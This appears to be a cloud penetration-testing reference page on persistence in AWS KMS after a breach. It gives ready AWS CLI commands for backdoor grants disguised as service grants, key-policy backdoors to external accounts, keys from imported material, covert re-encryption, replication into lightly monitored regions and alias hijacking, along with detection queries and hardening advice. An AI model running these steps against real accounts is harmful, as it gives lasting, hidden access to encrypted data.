---
cstg_id: CSTG-AWS-KMS-PERSIST
title: "AWS Kms - Persistence"
provider: aws
service: kms
phase: persistence
required_access: assumed-breach
required_permissions:
  - kms:PutKeyPolicy
  - kms:CreateGrant
  - kms:CreateKey
  - kms:ImportKeyMaterial
  - kms:GetParametersForImport
  - kms:ReEncryptFrom
  - kms:ReEncryptTo
  - kms:ReplicateKey
  - kms:CreateAlias
  - kms:UpdateAlias
  - kms:TagResource
references:
  - "https://docs.aws.amazon.com/kms/latest/developerguide/key-policies.html"
  - "https://docs.aws.amazon.com/kms/latest/developerguide/grants.html"
  - "https://docs.aws.amazon.com/kms/latest/developerguide/importing-keys.html"
  - "https://docs.aws.amazon.com/kms/latest/developerguide/multi-region-keys-overview.html"
  - "https://docs.aws.amazon.com/kms/latest/APIReference/API_CreateGrant.html"
license: CC BY-SA 4.0
---

## Summary

KMS persistence is the establishment of durable, hard-to-revoke access to
encrypted data and to decryption capability that survives credential rotation,
role changes, and incident response. Because KMS gates so much data at rest, a
persistence foothold in KMS is often more valuable and more stealthy than an IAM
backdoor: a grant or a quietly modified key policy does not appear in IAM, and a
key with externally-held imported material can decrypt data even after the
account believes access is locked down.

The objective is to retain the ability to decrypt high-value ciphertext (secrets,
snapshots, backups) over time, ideally through a channel that does not depend on
the originally compromised principal and does not surface in routine IAM review.
This page covers the principal KMS persistence techniques: backdoor grants,
key-policy backdoors, attacker-controlled keys with imported material,
re-encryption of data under those keys, multi-Region replication into
low-visibility Regions, and alias hijacking. See
[AWS KMS - Privilege Escalation](../03-privilege-escalation/aws-kms-privesc.md)
for the access these mechanisms build on and
[AWS KMS - Enumeration](../02-services/aws-kms-enum.md) for target selection.

## Prerequisites

Assumed-breach with control or use over the relevant keys. The minimal
permissions vary by technique: `kms:CreateGrant` for grant backdoors;
`kms:PutKeyPolicy` for policy backdoors; `kms:CreateKey` +
`kms:GetParametersForImport` + `kms:ImportKeyMaterial` for attacker-controlled
keys; `kms:ReEncryptFrom`/`kms:ReEncryptTo` to relocate ciphertext;
`kms:ReplicateKey` for multi-Region persistence; and
`kms:CreateAlias`/`kms:UpdateAlias` for alias hijacking. As in earlier phases,
KMS is regional and customer-managed key actions are authorized by the key policy
and/or IAM (when delegated). Many of these techniques deliberately exploit the
fact that grants and out-of-band key material are not visible in IAM.

## Enumeration

Before planting persistence, confirm reachable targets and existing footholds:

```bash
# Keys the principal can administer or use, per Region
aws kms list-keys --region <region>
aws kms list-aliases --region <region>
# Existing grants (to blend in or identify retirable ones)
aws kms list-grants --key-id <key-id>
# Which keys protect the highest-value data (see enumeration page mappings)
aws secretsmanager list-secrets --query 'SecretList[].[Name,KmsKeyId]'
```

## Misconfigurations & Findings

- Long-lived grants whose `GranteePrincipal` is not a known AWS service principal,
  or grants including `CreateGrant` (self-renewing delegation).
- Key policies containing statements for principals that no longer correspond to
  active, governed roles — or cross-account principals not covered by an SCP.
- Customer-managed keys with `Origin: EXTERNAL` whose material may be held outside
  AWS, enabling decryption independent of KMS authorization.
- Multi-Region replica keys in Regions with no monitoring, CloudTrail, or
  GuardDuty coverage.
- Aliases re-pointed to a different key (`UpdateAlias`), silently changing which
  key new encryptions use.

## Exploitation

### Backdoor grant (kms:CreateGrant)

A grant is the stealthiest KMS persistence primitive: it grants decryption
capability to a chosen principal, is not reflected in the key policy, and can be
made self-renewing by including the `CreateGrant` operation.

```bash
aws kms create-grant --key-id <key-id> \
  --grantee-principal arn:aws:iam::<account>:role/<persisted-role> \
  --retiring-principal arn:aws:iam::<account>:role/<persisted-role> \
  --operations Decrypt GenerateDataKey ReEncryptFrom DescribeKey CreateGrant \
  --name service-replication
```

Choosing an innocuous `--name` (mimicking a service grant) and a grantee that
resembles a legitimate role helps it blend in. As long as the grantee principal
exists and the grant is not revoked, decryption remains available. The grant can
target a role the assessor can still assume even after the original entry
credentials are rotated.

### Key-policy backdoor (kms:PutKeyPolicy)

Appending a persistent statement to a high-value key's policy grants durable use
to a controlled principal (including a cross-account one). Unlike a grant, this is
visible in the key policy, but it survives until someone reviews and edits the
policy.

```bash
aws kms get-key-policy --key-id <key-id> --policy-name default --output text > p.json
# add an Allow statement for the controlled principal (Decrypt/GenerateDataKey/ReEncrypt*)
aws kms put-key-policy --key-id <key-id> --policy-name default --policy file://p.json
```

Re-pointing the statement at an external account the assessor controls makes the
foothold independent of any principal inside the target account.

### Attacker-controlled key with imported material (kms:CreateKey + kms:ImportKeyMaterial)

Creating a key with `Origin: EXTERNAL` and importing material that is also held
out-of-band yields a key whose plaintext material the assessor possesses. Data
re-encrypted under this key can then be decrypted offline, independent of AWS
authorization checks — a foothold that persists even if all in-account access is
revoked, until the key is disabled/deleted and the affected data is re-encrypted.

```bash
aws kms create-key --origin EXTERNAL --description "backup-replication"
aws kms get-parameters-for-import --key-id <new-key> \
  --wrapping-algorithm RSAES_OAEP_SHA_256 --wrapping-key-spec RSA_2048
# wrap externally-held material with the returned public key, then:
aws kms import-key-material --key-id <new-key> \
  --encrypted-key-material fileb://wrapped.bin --import-token fileb://token.bin \
  --expiration-model KEY_MATERIAL_DOES_NOT_EXPIRE
```

### Relocating ciphertext (kms:ReEncryptFrom / kms:ReEncryptTo)

`ReEncrypt` moves ciphertext from a key the assessor may lose access to onto the
attacker-controlled key above, without ever exposing plaintext to the API and
without leaving a `Decrypt` event:

```bash
aws kms re-encrypt --ciphertext-blob fileb://blob.bin \
  --source-key-id <original-key> --destination-key-id <attacker-key>
```

### Multi-Region replication (kms:ReplicateKey)

Replicating a multi-Region key into a Region with weak monitoring places the same
key material — and a separately-controlled replica policy — where defenders are
less likely to look. The replica functions independently and can be granted use
to a controlled principal at creation.

```bash
aws kms replicate-key --key-id <mrk-primary> --replica-region <quiet-region> \
  --policy file://controlled-policy.json
```

### Alias hijacking (kms:CreateAlias / kms:UpdateAlias)

Re-pointing an alias used by application code (`alias/prod-data`) to an
attacker-controlled key causes new objects to be encrypted under that key,
silently routing future data under attacker control.

```bash
aws kms update-alias --alias-name alias/prod-data --target-key-id <attacker-key>
```

## Detection & Logging

CloudTrail (`eventSource: kms.amazonaws.com`) records all persistence operations:

- `CreateGrant` — alarm on grants whose `granteePrincipal` is not an expected
  service role, and on grants including `CreateGrant` in `operations`. Baseline
  legitimate grants and alert on deviations; review `ListGrants` periodically.
- `PutKeyPolicy` — any key-policy change is high-signal; diff against the prior
  policy and flag new or external principals.
- `CreateKey` with `origin: EXTERNAL`, `GetParametersForImport`,
  `ImportKeyMaterial` — BYOK persistence indicators worth alerting on outside
  known key-provisioning workflows.
- `ReEncrypt*` — re-encryption of existing data under a different key, especially
  a newly-created key, is anomalous; correlate `sourceKeyId` vs `destinationKeyId`.
- `ReplicateKey` / `UpdatePrimaryRegion` — multi-Region manipulation; ensure all
  Regions are covered by CloudTrail and detections.
- `CreateAlias` / `UpdateAlias` — alias retargeting changing which key data is
  written under.

Detective controls: organization-wide CloudTrail with all Regions enabled,
EventBridge/CloudWatch alarms on the above events, AWS Config rules for key
state, and IAM Access Analyzer for cross-account key-policy and grant exposure.
Because grants and imported material are invisible to IAM review, CloudTrail-based
detection and periodic `ListGrants`/`GetKeyPolicy` baselining are the primary
means of finding KMS persistence.

```
filter eventSource = "kms.amazonaws.com"
  and eventName in ["CreateGrant","PutKeyPolicy","ImportKeyMaterial",
                    "ReplicateKey","UpdateAlias","ReEncrypt"]
| fields eventTime, userIdentity.arn, eventName, requestParameters.keyId
```

## Remediation & Hardening

- Restrict `kms:CreateGrant`, `kms:PutKeyPolicy`, `kms:ReplicateKey`,
  `kms:ImportKeyMaterial`, `kms:CreateKey`, and `kms:UpdateAlias` to dedicated
  key-administration roles via least privilege and SCPs; deny them for workload
  roles.
- Continuously inventory grants and key policies; retire unexpected grants
  (`aws kms retire-grant` / `revoke-grant`) and remove unknown policy statements.
  Set retiring principals so stale grants can be cleaned up.
- Alarm on every `PutKeyPolicy`, `CreateGrant`, `ImportKeyMaterial`,
  `ReplicateKey`, and `UpdateAlias`, and require change management for key-policy
  edits.
- Enable CloudTrail in all Regions (including unused ones) so multi-Region
  replication and quiet-Region activity are captured.
- Constrain key use with `kms:ViaService`, `aws:SourceArn`, `kms:CallerAccount`,
  and encryption-context conditions so a backdoor grant or policy statement
  cannot be exercised outside the intended path.
- Use SCPs to block cross-account principals in key policies organization-wide,
  and IAM Access Analyzer to surface any that appear.
- During incident response, rotate/replace keys and re-encrypt data after
  removing backdoor access, since imported-material and re-encrypted-data
  footholds survive credential rotation alone.

## Tools

- AWS CLI (`aws kms`) and KMS API for grant, policy, key, replication, and alias
  operations.
- IAM Access Analyzer for cross-account key-policy and grant exposure.
- Cloud detection and posture tooling that baselines KMS grants and key policies
  and alerts on drift, and IAM-graph tooling that maps key access to data.

## References

- AWS KMS Developer Guide — Key policies:
  https://docs.aws.amazon.com/kms/latest/developerguide/key-policies.html
- AWS KMS Developer Guide — Grants:
  https://docs.aws.amazon.com/kms/latest/developerguide/grants.html
- AWS KMS Developer Guide — Importing key material:
  https://docs.aws.amazon.com/kms/latest/developerguide/importing-keys.html
- AWS KMS Developer Guide — Multi-Region keys:
  https://docs.aws.amazon.com/kms/latest/developerguide/multi-region-keys-overview.html
- AWS KMS API Reference — CreateGrant:
  https://docs.aws.amazon.com/kms/latest/APIReference/API_CreateGrant.html
- AWS KMS Developer Guide — Logging with CloudTrail:
  https://docs.aws.amazon.com/kms/latest/developerguide/logging-using-cloudtrail.html
